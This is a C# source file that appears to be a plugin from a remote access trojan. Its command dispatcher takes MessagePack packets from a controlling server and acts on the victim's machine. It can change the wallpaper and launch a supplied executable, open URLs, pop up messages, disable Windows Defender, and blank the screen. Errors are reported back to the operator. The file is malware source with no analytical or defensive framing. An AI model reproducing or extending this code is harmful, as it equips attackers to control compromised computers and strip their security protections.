using Plugin.Handler;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "wallpaper":
                        {
                            new Wallpaper().Change(unpack_msgpack.ForcePathObject("Image").GetAsBytes(), unpack_msgpack.ForcePathObject("Exe").AsString);
                            break;
                        }

                    case "visitURL":
                        {
                            string url = unpack_msgpack.ForcePathObject("URL").AsString;
                            if (!url.StartsWith("http"))
                            {
                                url = "http://" + url;
                            }
                            Process.Start(url);
                            break;
                        }

                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "disableDefedner":
                        {
                            new HandleDisableDefender().Run();
                            break;
                        }

                    case "blankscreen+":
                        {
                            new HandleBlankScreen().Run();
                            break;
                        }

                    case "blankscreen-":
                        {
                            new HandleBlankScreen().Stop();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
            Connection.Disconnected();
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}